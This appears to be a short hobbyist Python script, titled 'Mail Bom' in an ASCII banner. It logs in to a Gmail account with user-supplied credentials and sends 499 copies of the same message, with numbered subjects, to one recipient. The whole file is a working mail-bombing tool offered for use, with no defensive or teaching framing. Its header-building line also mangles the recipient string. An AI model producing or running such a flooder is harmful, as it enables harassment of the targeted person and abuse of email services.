# Coded By kryp70nx

import smtplib
print("\033[1;37;40m        ,--\033[1;31;40m.!,  ")
print("\033[1;30;40m     __\033[1;37;40m/   \033[1;31;40m-*-  ")
print("\033[1;30;40m   ,d08b.  \033[1;31;40m'|`  ")
print("\033[1;30;40m   0088MM     ")
print("   `9MMP'     \033[1;32;40mMail Bom\n\n")

gmail_user = input('\033[1;34;40mYour mail address: ')
gmail_password = input("Your Password: ")

sent_from = gmail_user
to = input("To: ")
body = input("Body: ")
i = 1

while i < 500:
    subject = i
    email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()

        print ('\n\033[1;32;40mEmail sent!')
    except:
        print ('\n\033[1;31;40mSomething went wrong...')
    i += 1
else:
    print("Done!")